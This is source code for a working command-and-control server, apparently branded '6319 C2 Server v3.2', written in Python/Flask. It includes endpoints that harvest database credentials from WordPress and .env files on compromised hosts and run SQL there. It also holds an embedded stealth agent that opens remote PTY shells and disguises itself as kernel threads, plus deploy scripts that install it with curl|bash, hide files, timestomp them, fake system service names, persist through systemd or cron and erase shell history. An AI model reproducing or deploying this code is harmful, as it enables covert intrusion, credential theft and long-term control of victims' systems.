@app.route('/api/clients/<client_id>/db/scan', methods=['POST'])
@require_auth
def api_db_scan(client_id):
    """Scan for database credentials in config files"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        cmd = r'''
for f in $(find /var/www /home -maxdepth 5 \( -name "wp-config.php" -o -name ".env" -o -name "configuration.php" -o -name "config.php" \) 2>/dev/null | head -5); do
    if grep -qE "(DB_|DATABASE_URL|db_host|mysqli)" "$f" 2>/dev/null; then
        echo "FILE:$f"
        if [[ "$f" == *"wp-config.php"* ]]; then
            grep -oP "define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "HOST:{}"
            grep -oP "define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "USER:{}"
            grep -oP "define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "PASS:{}"
            grep -oP "define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]\K[^'\"]+(?=['\"])" "$f" 2>/dev/null | head -1 | xargs -I{} echo "NAME:{}"
        elif [[ "$f" == *".env"* ]]; then
            grep -oP "DB_HOST=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "HOST:{}"
            grep -oP "DB_USERNAME=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "USER:{}"
            grep -oP "DB_PASSWORD=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "PASS:{}"
            grep -oP "DB_DATABASE=\K.+" "$f" 2>/dev/null | head -1 | xargs -I{} echo "NAME:{}"
        fi
        break
    fi
done
'''
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=20)
    if result is None:
        return jsonify({'error': 'Scan timed out'})
    
    stdout = result.get('stdout', '')
    creds = {'host': 'localhost', 'user': '', 'pass': '', 'name': ''}
    
    for line in stdout.split('\n'):
        line = line.strip()
        if line.startswith('HOST:'):
            creds['host'] = line[5:]
        elif line.startswith('USER:'):
            creds['user'] = line[5:]
        elif line.startswith('PASS:'):
            creds['pass'] = line[5:]
        elif line.startswith('NAME:'):
            creds['name'] = line[5:]
    
    if not creds['user']:
        return jsonify({'error': 'No credentials found'})
    
    return jsonify(creds)


@app.route('/api/clients/<client_id>/db/tables', methods=['POST'])
@require_auth
def api_db_tables(client_id):
    """Get list of tables from database"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        data = request.json or {}
        host = data.get('host', 'localhost').replace("'", "'\\''")
        user = data.get('user', '').replace("'", "'\\''")
        password = data.get('pass', '').replace("'", "'\\''")
        database = data.get('name', '').replace("'", "'\\''")
        
        if not user:
            return jsonify({'error': 'Username required'})
        
        cmd = f"mysql -h'{host}' -u'{user}' -p'{password}' -N -e 'SHOW TABLES' '{database}' 2>&1"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Query timed out'})
    
    stdout = result.get('stdout', '')
    if 'ERROR' in stdout or 'Access denied' in stdout:
        return jsonify({'error': stdout.split('\n')[0]})
    
    tables = [t.strip() for t in stdout.strip().split('\n') if t.strip()]
    return jsonify({'tables': tables})


@app.route('/api/clients/<client_id>/db/query', methods=['POST'])
@require_auth
def api_db_query(client_id):
    """Execute SQL query on target database"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        data = request.json or {}
        host = data.get('host', 'localhost').replace("'", "'\\''")
        user = data.get('user', '').replace("'", "'\\''")
        password = data.get('pass', '').replace("'", "'\\''")
        database = data.get('name', '').replace("'", "'\\''")
        query = data.get('query', '').strip()
        
        if not query:
            return jsonify({'error': 'Query required'})
        
        query_safe = query.replace("'", "'\\''").replace('\n', ' ')
        
        cmd = f"mysql -h'{host}' -u'{user}' -p'{password}' '{database}' -e '{query_safe}' --batch --column-names 2>&1"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=30)
    if result is None:
        return jsonify({'error': 'Query timed out'})
    
    stdout = result.get('stdout', '')
    if 'ERROR' in stdout:
        return jsonify({'error': stdout.split('\n')[0]})
    
    lines = stdout.strip().split('\n')
    if not lines or not lines[0]:
        return jsonify({'rows': [], 'columns': []})
    
    columns = lines[0].split('\t')
    rows = []
    for line in lines[1:]:
        if line.strip():
            values = line.split('\t')
            row = {}
            for i, col in enumerate(columns):
                row[col] = values[i] if i < len(values) else ''
            rows.append(row)
    
    return jsonify({'columns': columns, 'rows': rows})


@app.route('/install.sh')
def install_server_script():
    """Install script for deploying C2 server on VPS"""
    script = '''#!/bin/bash
set -e

echo "[*] Installing 6319 C2 Server v3.2..."

# Detect external IP
VPS_IP=$(curl -fsSL https://api.ipify.org 2>/dev/null || curl -fsSL https://ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
echo "[*] Detected IP: $VPS_IP"

# Install dependencies
apt-get update -qq
apt-get install -y -qq python3 python3-pip curl >/dev/null 2>&1

# Create directory
mkdir -p /opt/6319
cd /opt/6319

# Download server files
SERVER_URL="''' + get_server_url() + '''"
curl -fsSL "$SERVER_URL/bin/server.py" -o server.py
curl -fsSL "$SERVER_URL/bin/agent_stealth.py" -o agent_stealth.py
curl -fsSL "$SERVER_URL/bin/crypto.py" -o crypto.py
curl -fsSL "$SERVER_URL/bin/webhooks.py" -o webhooks.py
mkdir -p templates static
curl -fsSL "$SERVER_URL/bin/templates/index.html" -o templates/index.html
curl -fsSL "$SERVER_URL/bin/static/style.css" -o static/style.css

# Install Python deps
pip3 install flask flask-socketio pynacl gevent gevent-websocket -q

# Create systemd service with detected IP
cat > /etc/systemd/system/6319-c2.service << EOF
[Unit]
Description=6319 C2 Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/6319
ExecStart=/usr/bin/python3 /opt/6319/server.py
Restart=always
RestartSec=5
Environment=C2_IP=$VPS_IP

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable 6319-c2
systemctl start 6319-c2

echo ""
echo "[+] 6319 C2 Server installed and running"
echo "[*] Web UI: http://$VPS_IP:5000"
echo "[*] Agents port: 6318"
echo ""
echo "[DEPLOY AGENTS]"
echo "  curl -fsSL http://$VPS_IP:5000/stealth | bash"
'''
    return Response(script, mimetype='text/plain')


@app.route('/bin/<path:filename>')
def serve_bin(filename):
    """Serve server files for easy updates - no caching"""
    allowed_files = {
        'server.py': ('server.py', 'text/plain'),
        'agent_stealth.py': ('agent_stealth.py', 'text/plain'),
        'crypto.py': ('crypto.py', 'text/plain'),
        'webhooks.py': ('webhooks.py', 'text/plain'),
        'install.sh': ('install.sh', 'text/plain'),
        'templates/index.html': ('templates/index.html', 'text/html'),
        'static/style.css': ('static/style.css', 'text/css')
    }
    
    if filename not in allowed_files:
        return "Not found", 404
    
    path, mime = allowed_files[filename]
    filepath = os.path.join(os.path.dirname(__file__), path)
    if os.path.exists(filepath):
        response = make_response(send_file(filepath, mimetype=mime))
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response
    return "File not found", 404


STEALTH_AGENT_CODE = '''
import socket,json,hashlib,subprocess,os,sys,platform,getpass,time,select,struct,pty,fcntl,termios,signal,random,shutil,glob as gm
try:
    import ctypes;HAS_CTYPES=True
except:HAS_CTYPES=False
import nacl.secret
KNAMES=["[kworker/0:0]","[ksmd]","[kswapd0]","[watchdogd]","[rcu_preempt]","[migration/0]"]
DIRS=[os.path.expanduser("~/.config/.htop"),os.path.expanduser("~/.cache/.fontconfig")]
class Ch:
    def __init__(s,sec):s.box=nacl.secret.SecretBox(hashlib.sha256(sec.encode()).digest())
    def enc(s,d):ct=s.box.encrypt(json.dumps(d).encode());return len(ct).to_bytes(4,'big')+ct
    def dec(s,sock):
        try:
            sock.settimeout(30);lb=b''
            while len(lb)<4:
                c=sock.recv(4-len(lb))
                if not c:return None
                lb+=c
            l=int.from_bytes(lb,'big')
            if l>10*1024*1024:return None
            d=b''
            while len(d)<l:
                c=sock.recv(min(8192,l-len(d)))
                if not c:return None
                d+=c
            return json.loads(s.box.decrypt(d))
        except:return None
class PTY:
    def __init__(s,sid,cols=80,rows=24,cwd=None):
        s.sid=sid;s.mfd,sfd=pty.openpty()
        env=os.environ.copy();env['TERM']='xterm-256color';env['COLUMNS']=str(cols);env['LINES']=str(rows)
        s.pid=os.fork()
        if s.pid==0:
            os.setsid();os.dup2(sfd,0);os.dup2(sfd,1);os.dup2(sfd,2);os.close(s.mfd);os.close(sfd)
            if cwd and os.path.isdir(cwd):os.chdir(cwd)
            sh='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
            os.execve(sh,[sh,'-i'],env)
        os.close(sfd);fl=fcntl.fcntl(s.mfd,fcntl.F_GETFL);fcntl.fcntl(s.mfd,fcntl.F_SETFL,fl|os.O_NONBLOCK);s.rsz(cols,rows);s.alive=True
    def rsz(s,c,r):
        try:fcntl.ioctl(s.mfd,termios.TIOCSWINSZ,struct.pack('HHHH',r,c,0,0));os.kill(s.pid,signal.SIGWINCH)
        except:pass
    def wr(s,d):
        try:os.write(s.mfd,d.encode() if isinstance(d,str) else d);return True
        except:return False
    def rd(s,t=0.01):
        try:
            r,_,_=select.select([s.mfd],[],[],t)
            if s.mfd in r:return os.read(s.mfd,8192)
        except:pass
        return None
    def close(s):
        s.alive=False
        try:os.close(s.mfd)
        except:pass
        try:os.kill(s.pid,signal.SIGTERM);os.waitpid(s.pid,os.WNOHANG)
        except:pass
def hide(n):
    if HAS_CTYPES:
        try:ctypes.CDLL('libc.so.6').prctl(15,n.encode(),0,0,0)
        except:pass
    try:
        with open('/proc/self/comm','w') as f:f.write(n[:15])
    except:pass
    for v in['HISTFILE','HISTSIZE','HISTFILESIZE','PROMPT_COMMAND']:os.environ.pop(v,None)
    os.environ['HISTSIZE']='0';os.environ['HISTFILESIZE']='0'
    try:
        hf=os.path.expanduser('~/.bash_history')
        if os.path.exists(hf):open(hf,'w').close()
    except:pass
def daemon():
    try:
        if os.fork()>0:os._exit(0)
    except:pass
    os.setsid();os.umask(0)
    try:
        if os.fork()>0:os._exit(0)
    except:pass
    sys.stdout.flush();sys.stderr.flush()
    with open('/dev/null','r') as f:os.dup2(f.fileno(),sys.stdin.fileno())
    with open('/dev/null','a+') as f:os.dup2(f.fileno(),sys.stdout.fileno());os.dup2(f.fileno(),sys.stderr.fileno())
def selfdestruct():
    for p in['defunct','6319','htop']:
        try:subprocess.run(['pkill','-9','-f',p],capture_output=True,timeout=5)
        except:pass
    try:
        r=subprocess.run(['crontab','-l'],capture_output=True,text=True)
        if r.returncode==0:
            lines=[l for l in r.stdout.split('\\n') if '6319' not in l and 'defunct' not in l]
            subprocess.run(['crontab','-'],input='\\n'.join(lines),text=True,capture_output=True)
    except:pass
    for d in DIRS:
        if os.path.exists(d):
            try:shutil.rmtree(d,ignore_errors=True)
            except:pass
    os._exit(0)
def beacon(h,p,sec,info):
    sock=None
    try:
        sock=socket.socket();sock.settimeout(10);sock.connect((h,p))
        init=json.dumps({'secret':sec,'mode':'beacon'}).encode()
        sock.sendall(len(init).to_bytes(4,'big')+init)
        ch=Ch(sec);sock.sendall(ch.enc(info))
        resp=ch.dec(sock)
        if not resp:return None,0
        return resp.get('has_work',False),resp.get('sleep',0)
    except:return None,0
    finally:
        if sock:
            try:sock.close()
            except:pass
def session(h,p,sec,info):
    sock=None;ptys={};cwd=os.path.expanduser('~')
    try:
        sock=socket.socket();sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1);sock.settimeout(30);sock.connect((h,p))
        init=json.dumps({'secret':sec,'mode':'interactive'}).encode()
        sock.sendall(len(init).to_bytes(4,'big')+init)
        ch=Ch(sec);sock.sendall(ch.enc(info))
        resp=ch.dec(sock)
        if not resp:return
        sock.setblocking(False);st=time.time()+3600;it=time.time()+300
        while time.time()<st:
            rds=[sock]+[s.mfd for s in ptys.values() if s.alive]
            try:r,_,_=select.select(rds,[],[],0.1)
            except:break
            for sid,s in list(ptys.items()):
                if s.alive and s.mfd in r:
                    d=s.rd(0)
                    if d:it=time.time()+300;sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_data','session_id':sid,'data':d.decode('utf-8',errors='replace')}));sock.setblocking(False)
            if sock in r:
                it=time.time()+300;sock.setblocking(True);msg=ch.dec(sock);sock.setblocking(False)
                if not msg:break
                mt=msg.get('type',msg.get('cmd','exec'))
                if mt=='ping':sock.setblocking(True);sock.sendall(ch.enc({'status':'pong'}));sock.setblocking(False)
                elif mt=='disconnect':sock.setblocking(True);sock.sendall(ch.enc({'status':'disconnected'}));sock.close();return('disconnect',0)
                elif mt=='sleep':
                    m=msg.get('minutes',60);sock.setblocking(True);sock.sendall(ch.enc({'status':'sleeping','minutes':m}));sock.close();return('sleep',m*60)
                elif mt=='go_dark':
                    hrs=msg.get('hours',24);sock.setblocking(True);sock.sendall(ch.enc({'status':'going_dark','hours':hrs}));sock.close();return('go_dark',hrs*3600)
                elif mt=='self_destruct':sock.setblocking(True);sock.sendall(ch.enc({'status':'destroying'}));sock.close();selfdestruct()
                elif mt=='exec':
                    cmd=msg.get('data','').strip();sock.setblocking(True)
                    try:
                        if cmd.startswith('cd '):
                            nd=os.path.normpath(os.path.join(cwd,os.path.expanduser(cmd[3:].strip())) if not os.path.isabs(os.path.expanduser(cmd[3:].strip())) else os.path.expanduser(cmd[3:].strip()))
                            if os.path.isdir(nd):cwd=nd;sock.sendall(ch.enc({'stdout':f'Changed to {cwd}\\n','stderr':'','code':0}))
                            else:sock.sendall(ch.enc({'stdout':'','stderr':f'No such directory: {nd}\\n','code':1}))
                        else:
                            sh='/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
                            r=subprocess.run([sh,'-c',f'cd {cwd} && {cmd}'],capture_output=True,timeout=300)
                            sock.sendall(ch.enc({'stdout':r.stdout.decode(errors='replace'),'stderr':r.stderr.decode(errors='replace'),'code':r.returncode}))
                    except Exception as e:sock.sendall(ch.enc({'error':str(e)}))
                    sock.setblocking(False)
                elif mt=='pty_open':
                    sid=msg.get('session_id');cols,rows=msg.get('cols',80),msg.get('rows',24)
                    ptys[sid]=PTY(sid,cols,rows,cwd)
                    sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_opened','session_id':sid}));sock.setblocking(False)
                elif mt=='pty_data':
                    sid=msg.get('session_id')
                    if sid in ptys:ptys[sid].wr(msg.get('data',''))
                elif mt=='pty_resize':
                    sid=msg.get('session_id')
                    if sid in ptys:ptys[sid].rsz(msg.get('cols',80),msg.get('rows',24))
                elif mt=='pty_close':
                    sid=msg.get('session_id')
                    if sid in ptys:
                        ptys[sid].close();sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_exit','session_id':sid,'code':0}));sock.setblocking(False);del ptys[sid]
            for sid,s in list(ptys.items()):
                try:
                    pid,status=os.waitpid(s.pid,os.WNOHANG)
                    if pid!=0:
                        s.alive=False;sock.setblocking(True);sock.sendall(ch.enc({'type':'pty_exit','session_id':sid,'code':os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1}));sock.setblocking(False);del ptys[sid]
                except:pass
            if time.time()>it and not ptys:break
    except:pass
    finally:
        if sock:
            try:sock.close()
            except:pass
        for s in ptys.values():s.close()
host=os.environ.get('C2_HOST','HOST_PH')
port=int(os.environ.get('C2_PORT','PORT_PH'))
secret=os.environ.get('SECRET','SECRET_PH')
hidden=os.environ.get('HIDDEN_NAME',random.choice(KNAMES))
stealth=os.environ.get('STEALTH','1')=='1'
channel=os.environ.get('CHANNEL','stealth')
if stealth:daemon()
hide(hidden);sys.argv=['']
info={'hostname':platform.node(),'os':f'{platform.system()} {platform.release()}','user':getpass.getuser(),'arch':platform.machine(),'pid':os.getpid(),'hidden_name':hidden,'pty_support':True,'channel':channel}
while True:
    try:
        res=session(host,port,secret,info)
        if res:
            act,delay=res
            if act in('sleep','go_dark')and delay>0:time.sleep(delay);continue
        time.sleep(random.randint(5,15))
    except KeyboardInterrupt:break
    except:time.sleep(random.randint(5,15))
'''


def get_persist_script():
    """Generate persist deployment script with maximum stealth"""
    secret = request.args.get('s', generate_secret())
    server_url = get_server_url()
    c2_host = get_c2_host()
    
    script = f'''#!/bin/bash
set +o history
unset HISTFILE HISTFILESIZE HISTSIZE
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0

C2_URL="{server_url}"
C2_HOST="{c2_host}"
C2_PORT="{C2_SOCKET_PORT}"
SECRET="${{S:-{secret}}}"

# Dynamic kernel thread name based on CPU count
CPU_COUNT=$(nproc 2>/dev/null || echo 4)
CPU_ID=$((RANDOM % CPU_COUNT))
WORKER_ID=$((RANDOM % 4))
KERNEL_NAMES=("[kworker/$CPU_ID:$WORKER_ID]" "[kworker/u$((CPU_COUNT*2)):$WORKER_ID]" "[ksoftirqd/$CPU_ID]" "[migration/$CPU_ID]" "[rcu_preempt]" "[rcu_sched]" "[kswapd$((RANDOM%2))]" "[writeback]" "[kblockd]" "[irq/$((9+RANDOM%20))-pcie]")
HIDDEN_NAME="${{KERNEL_NAMES[$RANDOM % ${{#KERNEL_NAMES[@]}}]}}"

# Hidden directory candidates - mimic real system/app dirs
HIDDEN_DIRS=(
    "$HOME/.config/.pulse-cookie"
    "$HOME/.local/share/.gvfs-metadata"
    "$HOME/.cache/.fontconfig-2"
    "$HOME/.dbus/.sessions"
    "/var/tmp/.font-unix"
    "/dev/shm/.sem.ADSP_IPC"
)
INSTALL_DIR="${{HIDDEN_DIRS[$RANDOM % ${{#HIDDEN_DIRS[@]}}]}}"

# Hidden filenames - look like legitimate cache/lock files
HIDDEN_FILES=(".pulse-shm" ".gvfs-lock" ".fc-cache" ".dbus-session" ".Xauthority-c" ".ICE-unix")
AGENT_FILE="${{HIDDEN_FILES[$RANDOM % ${{#HIDDEN_FILES[@]}}]}}"

# Systemd service names - mimic real services
SERVICE_NAMES=("dbus-broker" "pulseaudio-daemon" "gvfs-daemon" "gnome-keyring-d" "at-spi-dbus-bus" "pipewire-pulse")
SERVICE_NAME="${{SERVICE_NAMES[$RANDOM % ${{#SERVICE_NAMES[@]}}]}}"

mkdir -p "$INSTALL_DIR" 2>/dev/null && chmod 700 "$INSTALL_DIR" 2>/dev/null

# Timestomp: use /etc/passwd as reference (always old)
if [[ -f /etc/passwd ]]; then
    touch -r /etc/passwd "$INSTALL_DIR" 2>/dev/null
else
    DAYS_AGO=$((90 + RANDOM % 275))
    if date --version 2>/dev/null | grep -q GNU; then
        OLD_TIME=$(date -d "$DAYS_AGO days ago" +%Y%m%d%H%M.%S)
    else
        OLD_TIME=$(date -v-${{DAYS_AGO}}d +%Y%m%d%H%M.%S 2>/dev/null)
    fi
    [[ -n "$OLD_TIME" ]] && touch -t "$OLD_TIME" "$INSTALL_DIR" 2>/dev/null
fi

# Download agent silently
curl -fsSL "$C2_URL/bin/agent_stealth.py" -o "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
chmod 600 "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null
touch -r /etc/passwd "$INSTALL_DIR/$AGENT_FILE" 2>/dev/null

# Config with secure permissions
cat > "$INSTALL_DIR/.c" << EOF
SYNC_HOST=$C2_HOST
SYNC_PORT=$C2_PORT
TOKEN=$SECRET
PNAME=$HIDDEN_NAME
MODE=persist
QUIET=1
CACHE=$AGENT_FILE
BEACON_MODE=0
CHANNEL=persist
STEALTH=1
EOF
chmod 600 "$INSTALL_DIR/.c" 2>/dev/null
touch -r /etc/passwd "$INSTALL_DIR/.c" 2>/dev/null

# Minimal launcher
cat > "$INSTALL_DIR/.r" << 'LAUNCHER'
#!/bin/bash
cd "$(dirname "$0")"
set -a;source ./.c 2>/dev/null;set +a
PY=$(command -v python3 || command -v python)
$PY -m pip install pynacl -q --break-system-packages 2>/dev/null || $PY -m pip install pynacl -q --user 2>/dev/null
exec $PY $CACHE </dev/null >/dev/null 2>&1
LAUNCHER
chmod 700 "$INSTALL_DIR/.r" 2>/dev/null
touch -r /etc/passwd "$INSTALL_DIR/.r" 2>/dev/null

# Persistence: prefer systemd user service, fallback to cron
PERSIST_OK=0
if [[ -d "$HOME/.config/systemd/user" ]] || mkdir -p "$HOME/.config/systemd/user" 2>/dev/null; then
    cat > "$HOME/.config/systemd/user/$SERVICE_NAME.service" << SVCEOF
[Unit]
Description=D-Bus Message Broker
After=dbus.socket

[Service]
Type=simple
ExecStart=$INSTALL_DIR/.r
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
SVCEOF
    systemctl --user daemon-reload 2>/dev/null
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null
    systemctl --user start "$SERVICE_NAME" 2>/dev/null && PERSIST_OK=1
fi

# Fallback: crontab (if systemd failed)
if [[ $PERSIST_OK -eq 0 ]]; then
    (crontab -l 2>/dev/null | grep -v "$INSTALL_DIR" || true; echo "@reboot $INSTALL_DIR/.r >/dev/null 2>&1") | crontab - 2>/dev/null
fi

# Start agent now (if not started by systemd)
if [[ $PERSIST_OK -eq 0 ]]; then
    cd "$INSTALL_DIR" && set -a && source ./.c 2>/dev/null && set +a
    PY=$(command -v python3 || command -v python)
    nohup $PY $CACHE </dev/null >/dev/null 2>&1 &
    disown 2>/dev/null
fi

# Clean evidence
history -c 2>/dev/null
unset C2_URL C2_HOST C2_PORT SECRET HIDDEN_NAME INSTALL_DIR AGENT_FILE SERVICE_NAME
'''
    return Response(script, mimetype='text/plain')


def get_stealth_script():
    """Generate stealth deployment script - memory-only execution"""
    secret = request.args.get('s', generate_secret())
    c2_host = get_c2_host()
    
    agent_code = STEALTH_AGENT_CODE.replace('HOST_PH', c2_host)
    agent_code = agent_code.replace('PORT_PH', str(C2_SOCKET_PORT))
    agent_code = agent_code.replace('SECRET_PH', secret)
    
    script = f'''#!/bin/bash
set +o history
unset HISTFILE HISTFILESIZE HISTSIZE
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0
PY=$(command -v python3||command -v python)
$PY -m pip install pynacl -q --break-system-packages 2>/dev/null||$PY -m pip install pynacl -q --user 2>/dev/null||true
C2_HOST="{c2_host}" C2_PORT="{C2_SOCKET_PORT}" SECRET="{secret}" CHANNEL="stealth" STEALTH=1 BEACON_MODE=1 exec $PY << 'PYEOF'
{agent_code}
PYEOF
'''
    return Response(script, mimetype='text/plain')


@app.route('/uninstall')
def uninstall_script():
    script = '''#!/bin/bash
set +o history
unset HISTFILE

# Kill all agent processes
for pattern in "kworker" "ksoftirqd" "migration" "rcu_" "kswapd" "writeback" "kblockd"; do
    for pid in $(pgrep -f "python.*$pattern" 2>/dev/null); do
        kill -9 $pid 2>/dev/null
    done
done
pkill -9 -f "pulse-shm\|gvfs-lock\|fc-cache\|dbus-session" 2>/dev/null

# Remove systemd services
for svc in dbus-broker pulseaudio-daemon gvfs-daemon gnome-keyring-d at-spi-dbus-bus pipewire-pulse; do
    systemctl --user stop "$svc" 2>/dev/null
    systemctl --user disable "$svc" 2>/dev/null
    rm -f "$HOME/.config/systemd/user/$svc.service" 2>/dev/null
done
systemctl --user daemon-reload 2>/dev/null

# Clean crontab
crontab -l 2>/dev/null | grep -v ".pulse\|.gvfs\|.font\|.dbus\|sem.ADSP\|defunct" | crontab - 2>/dev/null

# Remove hidden directories
HIDDEN_DIRS=(
    "$HOME/.config/.pulse-cookie" "$HOME/.local/share/.gvfs-metadata"
    "$HOME/.cache/.fontconfig-2" "$HOME/.dbus/.sessions"
    "/var/tmp/.font-unix" "/dev/shm/.sem.ADSP_IPC"
    "$HOME/.config/.pulse" "$HOME/.local/share/.gvfs"
    "$HOME/.cache/.thumbnails" "$HOME/.config/.htop"
    "$HOME/.local/share/.dbus" "$HOME/.cache/.fontconfig"
)
for dir in "${HIDDEN_DIRS[@]}"; do
    [[ -d "$dir" ]] && rm -rf "$dir" 2>/dev/null
done

# Clean shell rc files
for rc in ".bashrc" ".zshrc" ".profile" ".bash_profile"; do
    [[ -f "$HOME/$rc" ]] && sed -i '/pulse\|gvfs\|fontconfig\|dbus\|defunct\|6319/d' "$HOME/$rc" 2>/dev/null
done

echo "[+] Uninstalled v4.0"
'''
    return Response(script, mimetype='text/plain')


def register_dynamic_routes():
    """Register dynamic routes at startup"""
    app.add_url_rule(f'/{STEALTH_PATH}', 'stealth_deploy', get_stealth_script)
    app.add_url_rule(f'/{PERSIST_PATH}', 'persist_deploy', get_persist_script)
    if STEALTH_PATH != 'stealth':
        app.add_url_rule('/stealth', 'stealth_legacy', get_stealth_script)
    if PERSIST_PATH != 'x':
        app.add_url_rule('/x', 'persist_legacy', get_persist_script)
    
    if LOGIN_PATH:
        app.add_url_rule(f'/{LOGIN_PATH}', 'login_page', login_page_handler, methods=['GET', 'POST'])
    else:
        app.add_url_rule('/login', 'login_page', login_page_handler, methods=['GET', 'POST'])
    
    if DASHBOARD_PATH:
        app.add_url_rule(f'/{DASHBOARD_PATH}', 'dashboard', dashboard_handler)
        app.add_url_rule('/', 'root', root_redirect)
    else:
        app.add_url_rule('/', 'dashboard', dashboard_handler)
    
    app.add_url_rule('/logout', 'logout', logout_handler)


def main():
    detect_server_ip()
    register_dynamic_routes()
    
    print("""
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
   C2 Server v3.2 - Multi-Channel
""")
    
    server_url = get_server_url()
    
    print(f"[*] Server IP: {SERVER_IP}")
    print(f"[*] Encryption: NaCl (XSalsa20-Poly1305)")
    print(f"[*] Mode: Persistent + Multi-Channel")
    print(f"[*] WebSocket: Enabled (xterm.js terminal)")
    
    if AUTH_KEY:
        print(f"[*] Auth: Enabled (24h cookie)")
        login_path = LOGIN_PATH if LOGIN_PATH else 'login'
        print(f"[*] Login: /{login_path}")
    
    if DASHBOARD_PATH:
        print(f"[*] Dashboard: /{DASHBOARD_PATH}")
    
    if notifier.is_configured():
        print(f"[*] Webhooks: Configured")
    
    threading.Thread(target=socket_server, daemon=True).start()
    
    print(f"[*] Agents: port {C2_SOCKET_PORT}")
    print()
    print("\033[1;36m" + "=" * 60 + "\033[0m")
    
    if AUTH_KEY and LOGIN_PATH:
        print("\033[1;35m[ACCESS]\033[0m")
        print(f"  Login:     {server_url}/{LOGIN_PATH}")
        if DASHBOARD_PATH:
            print(f"  Dashboard: {server_url}/{DASHBOARD_PATH}")
        print(f"  Key:       {AUTH_KEY}")
        print()
    
    print("\033[1;32m[DEPLOY COMMANDS]\033[0m")
    print()
    print("\033[1;33mStealth (in-memory, no persistence):\033[0m")
    print(f'  bash -c "$(curl -fsSL {server_url}/{STEALTH_PATH})"')
    print()
    print("\033[1;33mPersist (hidden files, survives reboot):\033[0m")
    print(f'  bash -c "$(curl -fsSL {server_url}/{PERSIST_PATH})"')
    print("\033[1;36m" + "=" * 60 + "\033[0m")
    print()
    
    socketio.run(app, host='0.0.0.0', port=C2_WEB_PORT, debug=False, allow_unsafe_werkzeug=True)


@app.route('/raw/<filename>')
def raw_source(filename):
    """Serve raw source files for VPS installation"""
    import os
    base_dir = os.path.dirname(os.path.abspath(__file__))
    
    file_map = {
        'server.py': os.path.join(base_dir, 'server.py'),
        'crypto.py': os.path.join(base_dir, 'crypto.py'),
        'webhooks.py': os.path.join(base_dir, 'webhooks.py'),
        'index.html': os.path.join(base_dir, 'templates', 'index.html'),
        'style.css': os.path.join(base_dir, 'static', 'style.css'),
    }
    
    if filename not in file_map:
        return "Not found", 404
    
    filepath = file_map[filename]
    if not os.path.exists(filepath):
        return "File not found", 404
    
    with open(filepath, 'r') as f:
        content = f.read()
    
    return Response(content, mimetype='text/plain')


@app.route('/install.sh')
def install_script():
    """VPS installer script - downloads all files from this server"""
    server_url = get_server_url()
    
    script = f'''#!/bin/bash
set -e

C="\033[1;36m"
G="\033[1;32m"
Y="\033[1;33m"
R="\033[1;31m"
N="\033[0m"

INSTALL_DIR="/opt/6319"
SERVICE_NAME="6319-c2"
SOURCE_URL="{server_url}"

echo -e "${{C}}"
cat << 'BANNER'
    ██████╗ ██████╗  ██╗ █████╗ 
   ██╔════╝╚════██╗███║██╔══██╗
   ██████╗  █████╔╝╚██║╚██████║
   ██╔═══╝ ╚═══██╗ ██║ ╚═══██║
   ╚██████╗██████╔╝ ██║ █████╔╝
    ╚═════╝╚═════╝  ╚═╝ ╚════╝ 
   C2 Server v3.2 Installer
BANNER
echo -e "${{N}}"

info() {{ echo -e "${{G}}[+]${{N}} $1"; }}
warn() {{ echo -e "${{Y}}[!]${{N}} $1"; }}
err() {{ echo -e "${{R}}[-]${{N}} $1"; exit 1; }}

[[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"

detect_os() {{
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
    elif [ -f /etc/debian_version ]; then
        OS="debian"
    else
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    fi
    info "Detected OS: $OS"
}}

